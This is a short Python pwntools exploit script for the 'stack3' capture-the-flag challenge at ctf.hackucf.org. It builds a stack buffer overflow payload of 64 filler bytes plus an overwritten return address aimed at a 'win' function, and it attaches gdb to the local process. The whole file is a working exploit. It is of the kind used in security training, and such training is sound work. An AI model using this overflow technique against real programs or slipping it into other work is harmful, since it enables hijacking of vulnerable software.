from pwn import *
import time
#===============    Configuration    ================"
#Allow ptrace for gdb
# sudo sysctl -w kernel.yama.ptrace_scope=0
pwnName ="stack3"
local   = True
libName = ''
host, port  = 'ctf.hackucf.org', 9005
context.arch    ='i386'
context.os  = "linux"
context.log_level="DEBUG"
context.terminal= [ 'tmux' , 'splitw' , '-h' ]
#===================================================="
try:
	libc    = ELF(libName)
except:
	pass
try:
	elf     = ELF(pwnName)
	context.binary  = elf
except:
	pass
try:
	rop     = ROP([elf, libc])
except:
	pass

if local:
    r = process("./" + pwnName)
    gdb.attach(r, execute="c")
    time.sleep(0.5)
else:
    r = remote(host, port)

def sendToGDB(payload, breakpoint=None):
    if not local:
        return
    cmd = """ b main\n"""
    with open('payload', 'w+') as f:
        f.write(payload)
    gdb.attach(r, execute="c")

#====================================================="


def makePayload():
	buffSize = 64
	filler = 'a'*buffSize
	returnAddress = "\x24\x84\x04\x08" # location of win functon
	payload = filler + returnAddress
	print payload
	return payload


if __name__ == "__main__":

    payload = makePayload()
    sendToGDB(payload)
